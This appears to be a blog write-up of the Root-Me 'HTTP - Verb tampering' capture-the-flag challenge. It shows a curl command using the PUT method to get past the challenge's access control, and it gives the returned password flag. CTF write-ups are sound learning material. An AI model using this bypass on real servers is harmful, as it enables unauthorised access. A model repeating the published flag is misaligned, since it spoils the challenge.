---
title: HTTP - Verb tampering
author: thanguyen165
date: 2023-01-02 07:00:00 +0700
categories: [Practice, rootme]
tags: [Web Exploitation, rootme]
---

* Points: 15
* Link: [https://www.root-me.org/en/Challenges/Web-Server/HTTP-verb-tampering](https://www.root-me.org/en/Challenges/Web-Server/HTTP-verb-tampering)

## Statement

> Bypass the security establishment.

## Solution

Just try another method than GET/POST
```sh
curl -X PUT challenge01.root-me.org/web-serveur/ch8/
```
```html
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<html><head>
</head>

<h1>Mot de passe / password : a23e$dme96d3saez$$prap
</h1>
</body></html>
```

The flag is
```
a23e$dme96d3saez$$prap
```